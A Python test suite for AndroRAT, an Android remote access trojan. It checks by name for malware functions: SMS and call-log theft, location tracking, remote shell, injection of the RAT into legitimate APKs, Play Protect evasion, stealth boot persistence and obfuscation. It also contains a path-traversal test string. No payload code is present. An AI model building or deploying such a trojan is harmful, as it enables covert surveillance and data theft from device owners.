#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroRAT Comprehensive Functionality Test
Tests all backend functions, CLI commands, and callback features
"""

import unittest
import sys
import os
import subprocess

# Import test utilities to setup paths
from test_utils import setup_server_path, get_project_root
setup_server_path()

class BackendFunctionalityTests(unittest.TestCase):
    """Test all backend functions"""
    
    def setUp(self):
        self.project_root = get_project_root()
        self.server_dir = os.path.join(self.project_root, 'server')
        
    def test_utils_module_functions(self):
        """Test all critical utils module functions exist"""
        import utils
        
        # Core utility functions
        core_functions = [
            'stdOutput',
            'build',
            'execute',
            'getFile',
            'putFile',
            'readSMS',
            'callLogs',
            'getLocation',
            'getImage',
            'shell',
            'clear',
        ]
        
        missing_functions = []
        for func_name in core_functions:
            if not hasattr(utils, func_name):
                missing_functions.append(func_name)
        
        self.assertEqual(len(missing_functions), 0, 
                        f"Missing core functions: {missing_functions}")
        print(f"✓ All {len(core_functions)} core functions present")
        
    def test_advanced_evasion_functions(self):
        """Test advanced evasion and stealth functions exist"""
        import utils
        
        evasion_functions = [
            'apply_injection_obfuscation',
            'apply_play_protect_evasion',
            'apply_post_injection_evasion',
            'generate_random_package_name',
            'inject_rat_into_apk',
            'enhance_apk_for_stealth',
            'add_stealth_boot_receiver',
            'apply_advanced_string_obfuscation',
        ]
        
        missing_functions = []
        for func_name in evasion_functions:
            if not hasattr(utils, func_name):
                missing_functions.append(func_name)
        
        self.assertEqual(len(missing_functions), 0,
                        f"Missing evasion functions: {missing_functions}")
        print(f"✓ All {len(evasion_functions)} evasion functions present")
        
    def test_apk_injection_functions(self):
        """Test APK injection and merging functions exist"""
        import utils
        
        injection_functions = [
            'inject_rat_into_apk',
            'merge_android_manifests',
            'merge_apk_contents',
            'add_persistence_to_merged_apk',
            'sign_injected_apk',
            'build_rat_apk_for_injection',
        ]
        
        missing_functions = []
        for func_name in injection_functions:
            if not hasattr(utils, func_name):
                missing_functions.append(func_name)
        
        self.assertEqual(len(missing_functions), 0,
                        f"Missing injection functions: {missing_functions}")
        print(f"✓ All {len(injection_functions)} injection functions present")
        
    def test_security_functions(self):
        """Test security and encryption functions exist"""
        import utils
        
        security_functions = [
            'setup_ssl_context',
            'create_secure_connection_context',
            'encrypt_apk_strings',
            'implement_runtime_string_decryption',
        ]
        
        missing_functions = []
        for func_name in security_functions:
            if not hasattr(utils, func_name):
                missing_functions.append(func_name)
        
        self.assertEqual(len(missing_functions), 0,
                        f"Missing security functions: {missing_functions}")
        print(f"✓ All {len(security_functions)} security functions present")

class CLICommandTests(unittest.TestCase):
    """Test all CLI commands and options"""
    
    def setUp(self):
        self.project_root = get_project_root()
        self.server_dir = os.path.join(self.project_root, 'server')
        self.androrat_script = os.path.join(self.server_dir, 'androRAT.py')
        
    def test_help_command(self):
        """Test --help command works"""
        result = subprocess.run([sys.executable, self.androrat_script, '--help'],
                              capture_output=True, text=True, timeout=30,
                              cwd=self.server_dir)
        
        self.assertEqual(result.returncode, 0, "Help command should succeed")
        self.assertIn('usage', result.stdout.lower(), "Should show usage")
        print("✓ --help command works")
        
    def test_help_shows_all_options(self):
        """Test that help shows all available options"""
        result = subprocess.run([sys.executable, self.androrat_script, '--help'],
                              capture_output=True, text=True, timeout=30,
                              cwd=self.server_dir)
        
        required_options = [
            '--build',
            '--shell',
            '--ngrok',
            '--tunnel',
            '--ip',
            '--port',
            '--output',
            '--icon',
            '--stealth',
            '--random-package',
            '--anti-analysis',
            '--play-protect-evasion',
            '--advanced-obfuscation',
            '--inject',
            '--target-apk',
        ]
        
        missing_options = []
        for option in required_options:
            if option not in result.stdout:
                missing_options.append(option)
        
        self.assertEqual(len(missing_options), 0,
                        f"Missing CLI options: {missing_options}")
        print(f"✓ All {len(required_options)} CLI options documented")
        
    def test_validation_functions(self):
        """Test input validation functions"""
        import utils
        
        # Test IP validation if it exists
        if hasattr(utils, 'is_valid_ip'):
            self.assertTrue(utils.is_valid_ip('192.168.1.1'))
            self.assertFalse(utils.is_valid_ip('999.999.999.999'))
            print("✓ IP validation works")
        
        # Test port validation if it exists
        if hasattr(utils, 'is_valid_port'):
            self.assertTrue(utils.is_valid_port(8080))
            self.assertFalse(utils.is_valid_port(99999))
            print("✓ Port validation works")
        
        # Test filename validation if it exists  
        if hasattr(utils, 'is_valid_filename'):
            self.assertTrue(utils.is_valid_filename('output.apk'))
            self.assertFalse(utils.is_valid_filename('../etc/passwd'))
            print("✓ Filename validation works")

class AndroidCompatibilityTests(unittest.TestCase):
    """Test Android compatibility features"""
    
    def setUp(self):
        self.project_root = get_project_root()
        
    def test_android_14_support(self):
        """Test Android 14 specific features"""
        gradle_path = os.path.join(self.project_root, 
                                   'Android_Code/app/build.gradle')
        
        with open(gradle_path, 'r') as f:
            content = f.read()
        
        # Check for Android 14 (API 34)
        self.assertIn('compileSdkVersion 34', content,
                     "Should target Android 14")
        self.assertIn('targetSdkVersion 34', content,
                     "Should target Android 14")
        print("✓ Android 14 (API 34) support configured")
        
    def test_workmanager_dependency(self):
        """Test WorkManager dependency for background tasks"""
        gradle_path = os.path.join(self.project_root,
                                   'Android_Code/app/build.gradle')
        
        with open(gradle_path, 'r') as f:
            content = f.read()
        
        self.assertIn('androidx.work:work-runtime', content,
                     "Should have WorkManager dependency")
        print("✓ WorkManager dependency present")
        
    def test_modern_permissions_in_manifest(self):
        """Test modern Android permissions are present"""
        manifest_path = os.path.join(self.project_root,
                                    'Android_Code/app/src/main/AndroidManifest.xml')
        
        with open(manifest_path, 'r') as f:
            content = f.read()
        
        modern_permissions = [
            'POST_NOTIFICATIONS',  # Android 13+
            'READ_MEDIA_IMAGES',   # Android 13+
            'READ_MEDIA_VIDEO',    # Android 13+
            'READ_MEDIA_VISUAL_USER_SELECTED',  # Android 14+
            'FOREGROUND_SERVICE',  # Android 9+
            'FOREGROUND_SERVICE_CAMERA',  # Android 14+
            'FOREGROUND_SERVICE_MICROPHONE',  # Android 14+
            'FOREGROUND_SERVICE_LOCATION',  # Android 14+
        ]
        
        found_permissions = []
        for permission in modern_permissions:
            if permission in content:
                found_permissions.append(permission)
        
        self.assertGreater(len(found_permissions), 5,
                          "Should have most modern permissions")
        print(f"✓ {len(found_permissions)}/{len(modern_permissions)} modern permissions present")
        
    def test_enhanced_java_files_exist(self):
        """Test all enhanced Java files exist"""
        java_dir = os.path.join(self.project_root,
                               'Android_Code/app/src/main/java/com/example/reverseshell2')
        
        enhanced_files = [
            'BackgroundWorker.java',
            'WorkScheduler.java',
            'ModernStorageManager.java',
            'SecureTcpConnection.java',
            'SecureConnectionHandler.java',
        ]
        
        missing_files = []
        for filename in enhanced_files:
            filepath = os.path.join(java_dir, filename)
            if not os.path.exists(filepath):
                missing_files.append(filename)
        
        self.assertEqual(len(missing_files), 0,
                        f"Missing enhanced files: {missing_files}")
        print(f"✓ All {len(enhanced_files)} enhanced Java files present")

class TunnelingTests(unittest.TestCase):
    """Test tunneling functionality"""
    
    def test_tunneling_module_import(self):
        """Test tunneling module imports correctly"""
        try:
            import tunneling
            self.assertTrue(True)
            print("✓ Tunneling module imports successfully")
        except ImportError as e:
            self.fail(f"Failed to import tunneling module: {e}")
            
    def test_pyngrok_available(self):
        """Test pyngrok dependency is available"""
        try:
            import pyngrok
            self.assertTrue(True)
            print("✓ pyngrok dependency available")
        except ImportError:
            self.fail("pyngrok not installed")

def main():
    """Run comprehensive functionality tests"""
    print("=" * 80)
    print("ANDRORAT COMPREHENSIVE FUNCTIONALITY TEST")
    print("Testing all backend functions, CLI commands, and callback features")
    print("=" * 80)
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    test_classes = [
        BackendFunctionalityTests,
        CLICommandTests,
        AndroidCompatibilityTests,
        TunnelingTests,
    ]
    
    for test_class in test_classes:
        suite.addTest(loader.loadTestsFromTestCase(test_class))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "=" * 80)
    print("COMPREHENSIVE FUNCTIONALITY TEST SUMMARY")
    print("=" * 80)
    print(f"Tests Run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    
    if result.wasSuccessful():
        print("\n✅ ALL FUNCTIONALITY TESTS PASSED!")
        print("✓ Backend functions working")
        print("✓ CLI commands functional")
        print("✓ Android 14 compatibility confirmed")
        print("✓ Modern features implemented")
        print("✓ Tunneling support available")
    else:
        print("\n⚠️ Some tests failed - see details above")
    
    print("=" * 80)
    
    return result.wasSuccessful()

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
